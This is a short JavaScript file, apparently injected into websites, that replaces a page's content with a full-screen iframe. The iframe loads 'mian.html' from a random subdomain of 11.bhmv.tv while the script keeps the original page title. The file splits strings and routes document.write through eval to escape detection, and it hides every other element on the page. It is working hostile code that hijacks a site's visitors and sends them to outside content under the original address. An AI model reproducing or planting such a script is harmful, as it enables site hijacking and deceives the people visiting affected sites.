var titlestr=document.title;

// 生成随机三级域名前缀
function generateRandomSubdomain() {
    var chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    var result = '';
    for (var i = 0; i < 8; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}

// 动态获取当前域名和参数，将index.html改为mian.html，并使用随机三级域名
function getCurrentUrlWithMian() {
    var currentUrl = window.location.href;
    var randomSubdomain = generateRandomSubdomain();
    var newDomain = 'https://' + randomSubdomain + '.11.bhmv.tv';
    
    // 如果URL中包含index.html，则替换为mian.html
    if (currentUrl.indexOf('index.html') !== -1) {
        return currentUrl.replace(/https?:\/\/[^\/]+/, newDomain).replace(/index\.html/, 'mian.html');
    }
    
    // 如果URL中没有index.html，则添加mian.html
    // 处理不同的URL格式
    if (currentUrl.indexOf('?') !== -1) {
        // 如果有参数，在域名后添加mian.html
        return currentUrl.replace(/https?:\/\/[^\/]+/, newDomain) + '/mian.html';
    } else {
        // 如果没有参数，直接添加mian.html
        return currentUrl.replace(/https?:\/\/[^\/]+/, newDomain) + '/mian.html';
    }
}

setFrame(getCurrentUrlWithMian());


function setFrame(olink){
    var ss = '<title>'+titlestr+'</title>\
<div id="showcloneshengxiaon" style="height:100%;width:100%;background:#fff;overflow:hidden;">\
<ifr' + 'ame scrolling="yes" marginheight=0 marginwidth=0 frameborder="0" \
width="100%" height="100%" style="border:none;display:block;" src="'+olink+'"></iframe>\
</div>\
<style type="text/css">\
html,body{width:100%;height:100%;margin:0;padding:0;overflow:hidden;}\
</style>';

    eval("do" + "cu" + "ment.wr" + "ite('" + ss + "');");
    try {
      setTimeout(function() {
        console.log(document.body.children.length);
        for (var i = 0; i < document.body.children.length; i++) {
          try {
            var a = document.body.children[i].tagName;
            var b = document.body.children[i].id;
            console.log(i+"***"+a+"**"+b);
            if (b != "iconDiv1" && b != "showcloneshengxiaon" && a!="title") {
              document.body.children[i].style.display = "non" + "e"
            }
          } catch (e) {}
        }
        
         var oMeta = document.createElement('meta');
        oMeta.name = 'viewport';
        oMeta.content = 'width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no';
        document.getElementsByTagName('head')[0].appendChild(oMeta);
        
      }, 100)
    } catch (e) {}
}